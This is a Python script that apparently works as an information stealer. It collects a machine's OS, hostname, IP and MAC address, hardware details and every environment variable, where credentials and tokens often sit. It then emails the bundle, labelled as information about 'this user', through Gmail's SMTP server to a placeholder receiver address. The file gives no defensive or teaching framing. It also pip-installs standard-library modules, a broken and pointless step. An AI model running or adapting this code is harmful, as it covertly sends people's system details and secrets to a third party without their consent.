from email.message import EmailMessage
import os
import sys
import subprocess
import pip

def install(package):
    if hasattr(pip, 'main'):
        pip.main(['install', package])
    else:
        pip._internal.main(['install', package])

if __name__ == '__main__':
    install('socket')
    install('platform')
    install('re')
    install('uuid')
    install('psutil')
    install('logging')
    install('smtplib')
    install('ssl')

import socket
import platform
import re
import uuid
import psutil
import logging
import smtplib
import ssl

OS = (platform.platform())
SYSTEM = (platform.system())
Processor = (platform.processor())
Release = (platform.release())
Version = (platform.version())
Arch = (platform.machine())
Host = (socket.gethostname())
IP = (socket.gethostbyname(socket.gethostname()))
MAC = ((':'.join(re.findall('..', '%012x' % uuid.getnode()))))
RAM = (str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB")
#OSINF = (platform.freedesktop_os_release()) LINUX
JAVA = (platform.java_ver())
#LIBC = (platform.libc_ver()) Linux
NODE = (platform.node())
PY_Comp = (platform.python_compiler())
PY_imple = (platform.python_implementation())
PY_vers = (platform.python_version())
Sys_vers = (platform._sys_version())
Win32_ed = (platform.win32_edition())
Win32_ver = (platform.win32_ver())
Uname = (platform.uname())

diff = ""

for item in os.environ:
    
    diff = diff + (f'{item}{" : "}{os.environ[item]}\n')

text = (f"****INFORMATION ABOUT THIS USER:****\n\n\nOS: {OS}\nSYSTEM: {SYSTEM}\nProcessor: {Processor}\nRelease: {Release}\nVersion: {Version}\nArchitecture: {Arch}\nHost: {Host}\nIP: {IP}\nMAC: {MAC}\nRAM: {RAM}\nJava Version: {JAVA}\nNode: {NODE}\nPython_compiler: {PY_Comp}\nPython_implementation: {PY_imple}\nPython_version: {PY_vers}\n System Version: {Sys_vers}\nWin32_edition: {Win32_ed}\Win32_version: {Win32_ver}\nUname: {Uname}\nOTHER: {diff}")

email_sender = 'YOU@mail.com'
email_password = 'YOUR_SSL_PASSWORD'
email_receiver = 'receiver@mail.com'

subject = 'Information'
body = text

em = EmailMessage()
em['From'] = email_sender
em['To'] = email_receiver
em['Subject'] = subject
em.set_content(body)

context = ssl.create_default_context()

with smtplib.SMTP_SSL('smtp.gmail.com',465,context=context) as smtp:
    smtp.login(email_sender, email_password)
    smtp.sendmail(email_sender,email_receiver, em.as_string())
